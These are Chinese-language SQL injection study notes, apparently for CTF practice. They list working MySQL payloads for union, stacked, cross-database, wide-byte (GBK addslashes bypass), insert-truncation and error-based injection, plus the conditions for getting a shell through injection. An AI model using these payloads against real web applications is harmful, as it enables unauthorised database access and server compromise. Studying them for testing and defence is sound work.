# sql注入

1' or 1=1# 查看是否存在注入

1'  order by 10# 查看字段

' union select 1,2,3,4 # 显示字段

' union select 1,databases()# 显示数据库

' union select 1,table_name from information_schema.tables where table_schema='databases' 查看表名

# 堆叠注入

;handler FlagHere open;handler FlagHere read first;-


# 跨库注入
* 必须条件，数据库的用户必须是root用户

查看是否是root用户
union select user()%23

然后查看所有数据库名
union select group_concat(schema_name) from information_schema.schemata%23


# sql注入GetShell

* sql注入GetShell的必要条件，数据库的用户必须是root用户

	* union select user()%23

* 必须知道绝对路径，而且数据库配置文件中的secure_file_priv要等于空值
	1. 通过错误爆出路径
	2. 通过网站的遗留文件爆出路径（例如： phpinfo等）
	3. 通过漏洞爆出路径
	4. 根据对方的web服务器类型猜路径

# 多种方式注入

* GET
	- 直接?就行了（例：?id=plaody）

* POST
	- POST请求就是用于表单
	- 可以在表单里注入

* cookie
	- cookie注入就是在cookie里注入sql语句
	- 前提是要得有cookie
	- 注入方式可以使用burpstuie进行注入


# 参数注入类型

* 数字型
	- select * from user where id=1
	- select * from user where id=-1 union select 1,2,3

* 字符型
	- select * from user where id='str'
	- select * from user where id='-1' union select 1,2,3 --+'

* 搜索型
	- select * from user where user like id='%str%'
	- select * from user where user like id='%%'union select 1,2,3 '%%'

# 宽字节注入

宽字节注入条件:

> 使用的过滤php函数是addslashes
>
> mysql的字符编码是GBK编码

原理:

> 宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候会认为两个字符是一个汉字(前一个ascii码要大于128，才到汉字的范围)

例子:

> `'` 	-> 	\\' 	%5C%27 	//单引号经过addslashes这个函数给使用反斜杠转义了
>
> %df`'` 	->	%df%5C%27	//因为在GBK编码中两个url编码会被认为是一个汉字所以，插入了%df之后配合%5C这个url编码一起，数据库就会认为这是一个汉字，这样就可以对addslashes函数的反斜杠逃逸出去，做到了sql注入的目的
>
> 注:
>
> ​	不只是%df可以逃逸addslashes的反斜杠，只要是ascii码大于128的字符都可以利用

# insert注入

约束注入

在mysql的低版本中(目前我只在5.0.X的版本中复现成功)，insert插入一个数据，如果插入的数据超过了原本设定的表的字段长度，就会截断超出的部分，并丢弃，然后插入没超出的那些部分。

# 报错注入

`and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`

> `rand()` 	-> 	用于产生一个0~1的随机数
>
> `floor()`	-> 	向下取整
>
> rand()函数生成0~1，floor函数向下取整，值是固定的"0"，这里将rand*2，得到的值就是不固定的，"0"或者"1"

> 简化版:
>
> ​	select count(*) from table1 group by floor(rand()\*2)  